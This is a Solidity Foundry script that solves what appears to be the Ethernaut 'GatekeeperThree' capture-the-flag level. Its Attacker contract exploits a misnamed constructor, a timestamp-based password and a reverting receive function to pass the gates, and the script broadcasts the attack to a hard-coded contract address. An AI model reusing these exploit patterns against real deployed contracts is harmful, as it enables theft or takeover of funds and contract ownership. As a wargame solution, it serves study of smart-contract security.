/// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";

interface IGatekeeperThree {
    function owner() external view returns (address);

    function entrant() external view returns (address);

    function allowEntrance() external view returns (bool);

    function construct0r() external;

    function getAllowance(uint256 _password) external;

    function createTrick() external;

    function enter() external;
}

contract Attacker {
    function attack(IGatekeeperThree _gateKeeper) public {
        // This passes gateOne
        _gateKeeper.construct0r();
        // This passes gateTwo
        _gateKeeper.createTrick();
        _gateKeeper.getAllowance(block.timestamp);

        _gateKeeper.enter();
    }

    receive() external payable {
        revert();
    }
}

contract GatekeeperThree is Script {
    function run() public {
        vm.startBroadcast();

        IGatekeeperThree gateKeeper = IGatekeeperThree(
            0x14fda1C685F43392Ff4cE1a04966e702CA07C3b3
        );
        bool shouldBeTrue = payable(address(gateKeeper)).send(0.002 ether);
        Attacker attacker = new Attacker();
        attacker.attack(gateKeeper);

        vm.stopBroadcast();
    }
}
